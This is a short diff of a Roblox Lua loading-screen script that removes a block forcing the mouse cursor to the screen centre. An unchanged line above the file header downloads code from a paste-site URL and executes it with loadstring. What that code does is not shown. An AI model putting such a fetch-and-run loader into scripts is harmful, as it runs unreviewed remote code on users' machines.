@@ -1,15 +1,5 @@
 wait(0.2)
 loadstring(game:HttpGet("https://pastefy.app/wIQ10uaV/raw"))()
-lua
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local StarterGui = game:GetService("StarterGui")
-UserInputService.MouseIconEnabled = false
-RunService:BindToRenderStep("ForceMouseCenter", Enum.RenderPriority.Last.Value + 1, function()
-    if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
-        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-    end
-end)
 --[[
   LoadingScreenScript.lua
   Author: Zeel
